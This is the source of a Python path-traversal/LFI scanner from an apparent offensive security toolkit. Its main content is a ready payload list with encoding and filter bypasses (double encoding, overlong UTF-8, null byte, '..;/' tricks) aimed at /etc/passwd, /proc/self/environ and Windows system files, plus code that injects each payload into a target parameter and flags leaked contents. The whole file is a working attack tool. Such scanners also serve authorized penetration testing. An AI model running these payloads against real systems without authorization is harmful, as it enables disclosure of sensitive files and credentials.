#!/usr/bin/env python3
"""
redshift_toolkit.web.path_traversal — LFI / path-traversal scanner.

Tests classic and obfuscated traversal payloads against a parameter that
appears to take a filename or path. Matches markers from /etc/passwd,
/etc/hosts, win.ini, and Apache log paths.

Payload categories
------------------
- Plain dot-dot (../, ../../)
- URL-encoded (%2e%2e/, ..%2f)
- Double-URL-encoded (%252e%252e%252f)
- UTF-8 overlong (..\x2f, ..%c0%af)
- Backslash variants for Windows
- Null byte truncation (../etc/passwd%00.png) — works on old PHP
- Filter bypasses (....//, .%2e/, ..;/)
- File:// wrapper (sometimes accepted by parameters expecting URLs)
- /proc/ paths (information disclosure on Linux)

Usage
-----
  python3 -m redshift_toolkit.web.path_traversal \\
      --url 'https://app.example.com/file?name=index.html' --param name
  python3 -m redshift_toolkit.web.path_traversal \\
      --url 'https://app.example.com/api/render' --param template --data \\
      'template=hello'

Author: Redshift Project — Module 14
License: MIT
"""

from __future__ import annotations

import argparse
import json
import sys
from dataclasses import dataclass, asdict, field
from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


# Each tuple: (label, payload, indicator-substrings)
PAYLOADS: list[tuple[str, str, list[str]]] = [
    ("../etc/passwd", "../../../../../../../etc/passwd", ["root:x:", "/bin/bash"]),
    ("..%2fetc/passwd", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", ["root:x:"]),
    ("double-encoded", "..%252f..%252f..%252fetc%252fpasswd", ["root:x:"]),
    ("dot-slash-trick", "....//....//....//....//etc/passwd", ["root:x:"]),
    ("semicolon-trick", "..;/..;/..;/..;/etc/passwd", ["root:x:"]),
    ("nullbyte (legacy)", "../../../../etc/passwd%00.png", ["root:x:"]),
    ("../etc/hosts", "../../../../../../../etc/hosts", ["localhost", "127.0.0.1"]),
    ("/etc/passwd absolute", "/etc/passwd", ["root:x:"]),
    ("file://passwd", "file:///etc/passwd", ["root:x:"]),
    ("../../../proc/self/cmdline", "../../../proc/self/cmdline", []),  # marker is binary; show length
    ("../../../proc/self/environ", "../../../proc/self/environ", ["PATH=", "HOME="]),
    ("../../../proc/version", "../../../proc/version", ["Linux version"]),
    ("../windows/win.ini", "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        ["[fonts]", "[mci extensions]"]),
    ("../windows/win.ini (forward-slash)",
        "../../../../../../windows/win.ini",
        ["[fonts]", "[mci extensions]"]),
    ("../boot.ini", "../../../../../../boot.ini", ["[boot loader]"]),
    ("UTF-8 overlong", "..%c0%af..%c0%af..%c0%afetc/passwd", ["root:x:"]),
]


@dataclass
class TraversalFinding:
    label: str
    payload: str
    status: int
    body_len: int
    indicator: str | None = None


def _replace_param(url: str, body: str | None, name: str, value: str) -> tuple[str, str | None]:
    if body is None:
        sp = urlsplit(url)
        qs = parse_qsl(sp.query, keep_blank_values=True)
        new = []
        seen = False
        for k, v in qs:
            if k == name and not seen:
                new.append((k, value))
                seen = True
            else:
                new.append((k, v))
        if not seen:
            new.append((name, value))
        # Don't double-encode our payloads — they contain %-encoded sequences
        # we want preserved. Use safe= aggressively.
        return urlunsplit((sp.scheme, sp.netloc, sp.path,
                           urlencode(new, safe="/.%:?&"),
                           sp.fragment)), None
    parts = parse_qsl(body, keep_blank_values=True)
    new = []
    seen = False
    for k, v in parts:
        if k == name and not seen:
            new.append((k, value))
            seen = True
        else:
            new.append((k, v))
    if not seen:
        new.append((name, value))
    return url, urlencode(new, safe="/.%:?&")


def probe(url: str, param: str, *, body: str | None = None,
          method: str = "GET",
          headers: list[tuple[str, str]] | None = None,
          tls_verify: bool = True, timeout: float = 15.0) -> list[TraversalFinding]:
    out: list[TraversalFinding] = []
    h_base = list(headers or [])
    for label, payload, markers in PAYLOADS:
        new_url, new_body = _replace_param(url, body, param, payload)
        h = list(h_base)
        if new_body and not any(k.lower() == "content-type" for k, _ in h):
            h.append(("Content-Type", "application/x-www-form-urlencoded"))
        try:
            r = send(HttpRequest(method=method, url=new_url, headers=h, body=new_body),
                     timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
        except Exception as e:
            out.append(TraversalFinding(label=label, payload=payload,
                                        status=0, body_len=0,
                                        indicator=f"error: {e}"))
            continue
        body_text = r.body.decode("latin-1", errors="replace")
        indicator = next((m for m in markers if m in body_text), None)
        out.append(TraversalFinding(label=label, payload=payload,
                                    status=r.status, body_len=len(r.body),
                                    indicator=indicator))
    return out


def render_text(findings: list[TraversalFinding], color: bool) -> str:
    out = [paint("\n=== Path traversal probe ===", BOLD, color)]
    hits = 0
    for f in findings:
        if f.indicator and not f.indicator.startswith("error"):
            tag = paint("[HIT ]", RED, color)
            hits += 1
        elif f.indicator and f.indicator.startswith("error"):
            tag = paint("[err ]", YELLOW, color)
        else:
            tag = paint("[----]", GREEN, color)
        out.append(f"  {tag} {f.label:<32} status={f.status} len={f.body_len}")
        if f.indicator and not f.indicator.startswith("error"):
            out.append(f"          marker: {f.indicator!r}")
    out.append("")
    out.append(paint(f"[{hits} hit(s)]", BOLD, color))
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="LFI / path-traversal scanner.")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--data", help="POST body, x-www-form-urlencoded")
    ap.add_argument("-X", "--method", default=None)
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color and not args.json

    method = args.method or ("POST" if args.data else "GET")
    headers = []
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))

    findings = probe(args.url, args.param, body=args.data, method=method,
                     headers=headers, tls_verify=not args.insecure,
                     timeout=args.timeout)
    if args.json:
        print(json.dumps([asdict(f) for f in findings], indent=2))
    else:
        print(render_text(findings, color))

    return 0 if not any(f.indicator and not f.indicator.startswith("error")
                         for f in findings) else 1


if __name__ == "__main__":
    sys.exit(main())
